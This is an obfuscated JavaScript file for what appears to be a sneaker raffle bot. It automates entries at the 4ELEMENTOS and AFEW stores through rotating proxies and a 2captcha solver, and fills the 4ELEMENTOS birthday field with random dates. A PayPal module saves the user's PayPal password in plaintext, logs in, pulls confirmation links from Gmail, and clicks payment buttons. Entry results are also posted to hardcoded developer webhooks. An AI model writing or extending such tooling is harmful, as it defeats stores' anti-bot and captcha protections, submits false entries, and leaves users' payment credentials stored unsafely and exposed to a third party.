        if (_0x4bd959['Option'] < _0xc977df['length'])
            return _0xc977df[_0x4bd959['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x19b2df = {}, _0x112770 = await _0x551dbb['get']('Email');
        _0x19b2df['Email'] = _0x112770['Email'];
        var _0x23e113 = Math['round'](Math['random']() * (_0x189ae2['length'] - 0x1));
        _0x19b2df['Proxy'] = _0x189ae2[_0x23e113], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x2f58a3 = await _0x551dbb['get']('Password');
        return _0x19b2df['Password'] = _0x2f58a3['Password'], _0xf38118['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x19b2df['Email'] + ',' + _0x19b2df['Password'] + ',' + _0x19b2df['Proxy']), _0x19b2df;
    }
    let _0x199619 = await _0x27eaa8();
    var _0x5d20f0 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x22dcd0 = await _0x551dbb['get']('Amount'), _0x1c5448 = _0x22dcd0['Amount'];
    async function _0x27f2ae() {
        let _0x2fd6ea = 0x0;
        var _0x58a905 = new _0x373ca3({
            'user': _0x4a50c2['masterMail'],
            'password': _0x4a50c2['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x29daf6(_0x582865) {
            _0x58a905['openBox']('INBOX', ![], _0x582865);
        }
        _0x58a905['once']('ready', function () {
            _0x29daf6(function (_0x471d16, _0xdbb152) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x471d16)
                    throw _0x471d16;
                _0x58a905['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x134f46, _0x5d24f1) {
                    if (!_0x5d24f1 || !_0x5d24f1['length'])
                        console['log'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20No\x20mails\x20found'), _0x58a905['end']();
                    else {
                        _0x5d24f1 = _0x5d24f1['slice'](0x0, _0x1c5448);
                        var _0x336543 = _0x58a905['seq']['fetch'](_0x5d24f1, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x336543['on']('message', function (_0x34c0d7, _0x3846e2) {
                            var _0x1ec7ce = '(#' + _0x3846e2 + ')\x20';
                            _0x34c0d7['on']('body', function (_0x2194b5, _0x3481b0) {
                                _0x489d8f(_0x2194b5, (_0x35aa3c, _0x43daa3) => {
                                    if (_0x43daa3['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x43daa3['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x43daa3['text']['split']('[')[0x2];
                                        var _0x150eae = mes['split'](']')[0x0];
                                        _0x5d20f0['push'](_0x150eae);
                                    }
                                });
                            }), _0x34c0d7['once']('end', function () {
                                _0x2fd6ea++;
                            });
                        }), _0x336543['once']('error', function (_0x518ed5) {
                            console['log']('Fetch\x20error:\x20' + _0x518ed5);
                        }), _0x336543['once']('end', function () {
                            _0x58a905['end']();
                        });
                    }
                });
            });
        }), _0x58a905['once']('error', function (_0x4418be) {
            console['log'](_0x5631d3['red'](_0x4418be['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x58a905['once']('end', async function () {
        }), _0x58a905['connect']();
    }
    try {
        _0x27f2ae(), await _0xb9a1a7(0xfa0), console['log']('Found\x20' + _0x5d20f0['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xb9a1a7(0xfa0);
    }
    var _0x5a1160;
    _0x5bbc27('' + _0x51a455);
    var _0x42bdaa = _0x199619['Proxy']['split'](':'), _0x23f4f4;
    try {
        _0x23f4f4 = await _0x14f2e1['launch']({
            'userDataDir': 'sessions/' + _0x199619['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x42bdaa[0x0] + ':' + _0x42bdaa[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x23f4f4 = await _0x14f2e1['launch']({
            'userDataDir': 'sessions/' + _0x199619['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x42bdaa[0x0] + ':' + _0x42bdaa[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20Getting\x20Session');
        const _0x3f6c9c = await _0x23f4f4['newPage']();
        await _0x3f6c9c['authenticate']({
            'username': '' + _0x42bdaa[0x2],
            'password': '' + _0x42bdaa[0x3]
        }), await _0x3f6c9c['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3f6c9c['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3f6c9c['waitForSelector']('#email');
            let _0x459db3 = await _0x3f6c9c['$eval']('#email', _0x4cb81a => _0x4cb81a['getAttribute']('value'));
            if (_0x459db3 == '') {
                await _0x3f6c9c['type']('#email', _0x199619['Email']), await _0xb9a1a7(0x1d3);
                let _0x36bbc4 = await _0x3f6c9c['$']('#splitPassword');
                _0x36bbc4 && (await _0x3f6c9c['click']('#btnNext'), await _0xb9a1a7(0xa28)), await _0x3f6c9c['type']('#password', _0x199619['Password']), await _0xb9a1a7(0x35c), await _0x3f6c9c['click']('#btnLogin');
            } else
                await _0x3f6c9c['type']('#password', _0x199619['Password']), await _0xb9a1a7(0x35c), await _0x3f6c9c['click']('#btnLogin');
            await _0x3f6c9c['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20Successfully\x20logged\x20in'), await _0xb9a1a7(0x2710);
        } catch (_0x295271) {
            throw new Error('Login\x20session\x20expired\x20' + _0x295271);
        }
        for (var _0x36f28d = 0x0; _0x36f28d < _0x5d20f0['length']; _0x36f28d++) {
            console['log'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20Task\x20' + (_0x36f28d + 0x1) + '\x20:\x20Starting\x20Verification'), _0x5bbc27(_0x51a455 + '\x20Task\x20' + (_0x36f28d + 0x1) + '\x20/\x20' + _0x5d20f0['length']);
            const _0x60a5d1 = await _0x23f4f4['newPage']();
            await _0x60a5d1['goto']('' + _0x5d20f0[_0x36f28d], { 'waitUntil': 'networkidle2' }), await _0xb9a1a7(0xbb8);
            try {
                const _0x57175f = await _0x60a5d1['$']('#challenge-heading');
                _0x57175f && (console['log'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20Task\x20' + (_0x36f28d + 0x1) + '\x20:\x20' + _0x5631d3['yellow']('2FA\x20Required')), await _0x60a5d1['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xb9a1a7(0x9c40), await _0x60a5d1['waitForSelector']('#payment-submit-btn'), await _0x60a5d1['$eval']('#payment-submit-btn', _0xbcbfbf => _0xbcbfbf['click']()), await _0x60a5d1['click']('#payment-submit-btn');
                try {
                    await _0x60a5d1['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xb9a1a7(0x5dc), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20Task\x20' + (_0x36f28d + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x51bf1b) {
                    _0x2f6385 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x51bf1b['message']);
                } finally {
                    if (_0x2f6385 == 'yes' && _0x56fab0 != 0x2) {
                        console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x51a455['name'] + ']\x20Task\x20' + (_0x36f28d + 0x1) + '\x20:\x20Retrying\x20(' + _0x56fab0 + '\x20/\x205)')), _0x36f28d = _0x36f28d - 0x1, _0x56fab0 = _0x56fab0 + 0x1;
                        continue;
                    }
                    _0x2f6385 == 'yes' && _0x56fab0 >= 0x2 && (_0x100e1d(csv[_0x36f28d], _0x51a455), _0x2f6385 = 'no', _0x56fab0 = 0x0), await _0x60a5d1['close'](), await _0xb9a1a7(0x4650);
                }
            } catch (_0x1f04bd) {
                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x51a455 + ']\x20Task\x20' + (_0x36f28d + 0x1) + '\x20:\x20' + _0x1f04bd));
            }
        }
    } catch (_0x4221a7) {
        console['log'](_0x5631d3['red']('' + _0x4221a7));
    } finally {
        await _0x23f4f4['close']();
    }
}
const _0x2a4370 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0xdfaa4d, _0x58df9e, _0x4d394f) {
                _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4a50c2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x10be7a = 0x0; _0x10be7a < _0x58df9e['length']; _0x10be7a++) {
                    if (_0x3a8c18 != 'yes')
                        var _0x3a8c18 = '', _0x575f56 = 0x0;
                    var _0x35fcba;
                    try {
                        await _0x2dc03a(_0x58df9e, _0x10be7a);
                    } catch {
                        _0x3a8c18 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x5bbc27(_0xdfaa4d['name'] + '\x20Task\x20' + (_0x10be7a + 0x1) + '\x20/\x20' + _0x58df9e['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                    var _0x4be9f3 = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x4bf2f9 = Math['round'](Math['random']() * (_0x4be9f3['length'] - 0x1));
                    _0x58df9e[_0x10be7a]['Size'] == 'RANDOM' && (_0x58df9e[_0x10be7a]['Size'] = _0x4be9f3[_0x4bf2f9]);
                    var _0xa3c924 = Math['round'](Math['random']() * (_0x4d394f['length'] - 0x1)), _0x2c91dd = _0x4d394f[_0xa3c924]['split'](':'), _0x13ce77;
                    try {
                        _0x13ce77 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2c91dd[0x0] + ':' + _0x2c91dd[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x13ce77 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2c91dd[0x0] + ':' + _0x2c91dd[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x39d741 = await _0x13ce77['newPage']();
                        await _0x39d741['authenticate']({
                            'username': '' + _0x2c91dd[0x2],
                            'password': '' + _0x2c91dd[0x3]
                        }), await _0x39d741['setRequestInterception'](!![]), _0x39d741['on']('request', _0x5c7f86 => {
                            _0x5c7f86['resourceType']() === 'image' || _0x5c7f86['resourceType']() === 'font' || _0x5c7f86['resourceType']() === 'media' ? _0x5c7f86['abort']() : _0x5c7f86['continue']();
                        }), await _0x39d741['goto'](_0x58df9e[_0x10be7a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20Starting\x20Entry'), await _0xb9a1a7(0x3e8), await _0x39d741['waitForSelector']('#accept-all-gdpr'), await _0x39d741['click']('#accept-all-gdpr'), await _0x39d741['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0xb9a1a7(0xbb8);
                        let _0x3608ee = await _0x39d741['$$']('button');
                        for (button of _0x3608ee) {
                            let _0x99e81f = await _0x39d741['evaluate'](_0x3c34f2 => _0x3c34f2['innerHTML'], button);
                            if (_0x99e81f['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0xb9a1a7(0x1388), await _0x39d741['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20Checking\x20Information'), await _0xb9a1a7(0x3e8);
                        let _0x3af1d5 = await _0x39d741['$$']('input[name=\x22email\x22]');
                        await _0x3af1d5[0x1]['click'](), await _0xb9a1a7(0x12c), await _0x39d741['keyboard']['type'](_0x58df9e[_0x10be7a]['Email']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22Nombre\x22]', _0x58df9e[_0x10be7a]['FirstName'] + '\x20' + _0x58df9e[_0x10be7a]['LastName']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22Direccion\x22]', _0x58df9e[_0x10be7a]['Address1'] + '\x20' + _0x58df9e[_0x10be7a]['HouseNumber'] + '\x20' + _0x58df9e[_0x10be7a]['Address2']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22Ciudad\x22]', _0x58df9e[_0x10be7a]['City']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22Provincia\x22]', _0x58df9e[_0x10be7a]['State']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22CP\x22]', _0x58df9e[_0x10be7a]['Zip']), await _0xb9a1a7(0x1c2), await _0x39d741['select']('select[name=\x22Pais\x22]', _0x58df9e[_0x10be7a]['Country']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22Telefono\x22]', _0x58df9e[_0x10be7a]['Phone']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22cumple\x22]', _0x5c4736(0x1, 0x14) + '-' + _0x5c4736(0x1, 0xb) + '-' + _0x5c4736(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22Instagram\x22]', _0x58df9e[_0x10be7a]['Follower']), await _0xb9a1a7(0x1c2), await _0x39d741['type']('input[name=\x22Talla\x22]', _0x58df9e[_0x10be7a]['Size']), await _0xb9a1a7(0x1f4), await _0x39d741['click']('#sexo_hombre'), await _0xb9a1a7(0x1f4), await _0x39d741['click']('#idioma_ingles'), await _0xb9a1a7(0x1f4), await _0x39d741['click']('#privacidad_si'), await _0xb9a1a7(0x1f4), await _0x39d741['click']('#acepta_suscripcion_si'), await _0xb9a1a7(0x1f4), console['log'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x3874da = await _0x39d741['$$']('button');
                        for (button of _0x3874da) {
                            let _0x46a8c7 = await _0x39d741['evaluate'](_0x5d648a => _0x5d648a['innerHTML'], button);
                            if (_0x46a8c7['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0xb9a1a7(0x1388), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x3a8c18 = '';
                        var _0x36e4c8 = await _0x530ba6(_0x58df9e[_0x10be7a], _0xdfaa4d, 'dev', ![]), _0x28b0b8 = await _0x530ba6(_0x58df9e[_0x10be7a], _0xdfaa4d, 'pub', ![]);
                        const _0x2bdb5d = {
                            'succesDEVMSG': { 'embeds': [_0x36e4c8] },
                            'succesPUBMSG': { 'embeds': [_0x28b0b8] }
                        };
                        try {
                            _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x2bdb5d['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x2bdb5d['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x2bdb5d['succesPUBMSG']);
                        } catch (_0x577c2f) {
                            console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x577c2f));
                        }
                    } catch (_0x45ba1c) {
                        console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20' + _0x45ba1c)), _0x35fcba = '' + _0x45ba1c;
                        var _0x25c5f4 = await _0x530ba6(_0x58df9e[_0x10be7a], _0xdfaa4d, 'dev', !![], _0x35fcba), _0x36e4c8 = await _0x530ba6(_0x58df9e[_0x10be7a], _0xdfaa4d, 'dev', ![]), _0x28b0b8 = await _0x530ba6(_0x58df9e[_0x10be7a], _0xdfaa4d, 'pub', ![]);
                        const _0x4310a8 = {
                            'succesDEVMSG': { 'embeds': [_0x36e4c8] },
                            'succesPUBMSG': { 'embeds': [_0x28b0b8] }
                        };
                        _0x4310a8['errorDEV'] = { 'embeds': [_0x25c5f4] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x4310a8['errorDEV']), await _0x313aa7(_0x4190b7, _0x4310a8['errorDEV']), _0x45ba1c != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3a8c18 = 'yes');
                    } finally {
                        _0x13ce77['close']();
                        if (_0x3a8c18 == 'yes' && _0x575f56 != 0x5 && _0x35fcba != 'Size\x20Not\x20Found') {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Task\x20' + (_0x10be7a + 0x1) + '\x20:\x20Retrying\x20(' + _0x575f56 + '\x20/\x205)\x20')), _0x10be7a = _0x10be7a - 0x1, _0x575f56 = _0x575f56 + 0x1;
                            continue;
                        }
                        _0x3a8c18 == 'yes' && _0x575f56 >= 0x5 && (_0x100e1d(_0x58df9e[_0x10be7a], _0xdfaa4d), _0x3a8c18 = 'no', _0x575f56 = 0x0), console['log'](_0x5b6bc2() + '\x20[' + _0xdfaa4d['name'] + ']\x20Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x3b94f9, _0x1c473c, _0x4c8cb9) {
                for (var _0x142b9b = 0x0; _0x142b9b < _0x1c473c['length']; _0x142b9b++) {
                    _0x4a50c2['AfewDelay'] = _0x4a50c2['delay'];
                    var _0x3b13b6;
                    if (_0x327bee != 'yes')
                        var _0x327bee = '', _0x55fea0 = 0x0;
                    var _0x54bd93 = _0x1c473c[_0x142b9b]['Url'], _0x26e7d5 = _0x1c473c[_0x142b9b];
                    _0x5bbc27(_0x3b94f9['name'] + '\x20Task\x20' + (_0x142b9b + 0x1) + '\x20/\x20' + _0x1c473c['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                    try {
                        await _0x2dc03a(_0x1c473c, _0x142b9b);
                    } catch {
                        _0x327bee = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x18e25d(_0xde8f71) {
                        const _0x3f16fa = _0xf38118['readFileSync']('../successful-tasks.csv', 'utf8'), _0x8ff8 = _0x2587e1['parse'](_0x3f16fa, { 'header': !![] })['data'];
                        let _0x7670ca = ![];
                        for (var _0x693a5f of _0x8ff8) {
                            if (_0x693a5f['Url'] == _0xde8f71['Url'] && _0x693a5f['Email'] == _0xde8f71['Email']) {
                                _0x7670ca = !![];
                                break;
                            }
                        }
                        return _0x7670ca;
                    }
                    if (await _0x18e25d(_0x1c473c[_0x142b9b]) == !![]) {
                        console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x351c8a = await _0x530ba6(_0x1c473c[_0x142b9b], _0x3b94f9, 'dev', ![]), _0x1487a9 = await _0x530ba6(_0x1c473c[_0x142b9b], _0x3b94f9, 'pub', ![]);
                    const _0x1cd3d1 = {
                        'succesDEVMSG': { 'embeds': [_0x351c8a] },
                        'succesPUBMSG': { 'embeds': [_0x1487a9] }
                    };
                    if (_0x1c473c[_0x142b9b]['Email'] == '' || _0x1c473c[_0x142b9b]['FirstName'] == '' || _0x1c473c[_0x142b9b]['LastName'] == '' || _0x1c473c[_0x142b9b]['Country'] == '' || _0x1c473c[_0x142b9b]['Size'] == '' || _0x1c473c[_0x142b9b]['Address1'] == '' || _0x1c473c[_0x142b9b]['Zip'] == '') {
                        console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x1c473c[_0x142b9b]['Country']['length'] == 0x2 && (_0x1c473c[_0x142b9b]['Country'] = _0x366b4f[_0x1c473c[_0x142b9b]['Country']]);
                    if (_0x4a50c2['useRandomProxy'] = ![])
                        var _0x5582d = _0x4c8cb9[_0x142b9b]['split'](':');
                    else
                        var _0x1ed29b = Math['round'](Math['random']() * (_0x4c8cb9['length'] - 0x1)), _0x5582d = _0x4c8cb9[_0x1ed29b]['split'](':');
                    var _0x2696c7;
                    try {
                        _0x2696c7 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5582d[0x0] + ':' + _0x5582d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2696c7 = await _0x14f2e1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5582d[0x0] + ':' + _0x5582d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x39ecd0 = JSON['parse'](_0xf38118['readFileSync']('sizes.json', 'utf-8')), _0x54bd93 = _0x1c473c[_0x142b9b]['Url'], _0x2b4097 = _0x1c473c[_0x142b9b]['Size'], _0x3ef536;
                        async function _0x5d7acb() {
                            var _0x36a87f = new _0x17d4a1['CookieJar']();
                            console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x2ecd2e;
                            let _0x896ae2 = {
                                'method': 'GET',
                                'cookieJar': _0x36a87f,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x5582d[0x2] + ':' + _0x5582d[0x3] + '@' + _0x5582d[0x0] + ':' + _0x5582d[0x1]
                            }, _0x45382c = _0x54bd93['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x273263 = _0x45382c + '.json', _0xf96f13 = await _0x358674(_0x273263);
                            console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x325fc9 = _0xf96f13['data']['product']['variants'];
                            if (_0x2b4097 != 'RANDOM') {
                                if (_0x325fc9[0x1]['option1']['includes']('W')) {
                                    const _0x184783 = _0x39ecd0['women']['find'](_0x2555bf => _0x2555bf['EUsize'] === _0x2b4097);
                                    _0x184783 && (_0x2b4097 = _0x184783['size']);
                                } else {
                                    if (_0x325fc9[0x1]['option1']['includes']('Y')) {
                                        const _0x57afa2 = _0x39ecd0['men']['find'](_0x3b20bb => _0x3b20bb['EUsize'] === _0x2b4097);
                                        _0x57afa2 && (_0x2b4097 = _0x57afa2['size'] + 'Y');
                                    } else {
                                        const _0x1a51a0 = _0x39ecd0['men']['find'](_0x270a5e => _0x270a5e['EUsize'] === _0x2b4097);
                                        _0x1a51a0 && (_0x2b4097 = _0x1a51a0['size']);
                                    }
                                }
                                for (var _0x35630c of _0x325fc9) {
                                    _0x35630c['option1'] == _0x2b4097 && (_0x2ecd2e = _0x35630c['id']);
                                }
                            } else {
                                var _0x757136 = Math['round'](Math['random']() * (_0x325fc9['length'] - 0x1));
                                _0x2ecd2e = _0x325fc9[_0x757136]['id'];
                            }
                            console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x358674('https://raffles.afew-store.com/cart/' + _0x2ecd2e + ':1'), _0x3ef536 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x5d7acb();
                        } catch (_0x572be0) {
                            if (_0x572be0['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x572be0);
                        }
                        const _0x499c41 = await _0x2696c7['newPage']();
                        await _0x499c41['setDefaultNavigationTimeout'](0x1d4c0), await _0x499c41['authenticate']({
                            'username': '' + _0x5582d[0x2],
                            'password': '' + _0x5582d[0x3]
                        }), await _0x499c41['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x499c41['setRequestInterception'](!![]), _0x499c41['on']('request', _0x1588d0 => {
                            _0x1588d0['resourceType']() === 'image' || _0x1588d0['resourceType']() === 'font' || _0x1588d0['resourceType']() === 'media' ? _0x1588d0['abort']() : _0x1588d0['continue']();
                        });
                        try {
                            await _0x499c41['goto'](_0x3ef536, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x499c41['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
